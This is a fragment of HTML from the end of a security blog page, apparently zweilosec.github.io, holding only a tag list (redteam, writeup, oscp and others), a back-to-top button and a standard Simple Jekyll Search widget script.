class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/unfinished/">unfinished</a> <a class="post-tag" href="/tags/oscp/">oscp</a> <a class="post-tag" href="/tags/tj-null/">tj_null</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://zweilosec.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
